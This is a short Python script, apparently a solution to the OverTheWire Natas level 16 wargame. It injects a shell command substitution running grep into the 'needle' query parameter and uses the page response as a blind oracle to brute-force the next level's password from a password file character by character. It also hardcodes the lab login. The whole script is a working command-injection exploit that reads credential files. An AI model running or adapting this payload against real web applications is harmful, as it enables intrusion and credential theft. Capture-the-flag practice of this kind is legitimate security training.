import requests

url='http://natas16.natas.labs.overthewire.org'
ch='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
password=''

for i in range(32):
    for j in ch:
        req = requests.get(url+'/?needle=false$(grep ^' + password + j + ' /etc/natas_webpass/natas17)',
         auth=('natas16', 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V'))
        #print(req.status_code)
        #print(req.text)
        if  'false' not in req.text:
            password = password + j
            print(password)
            break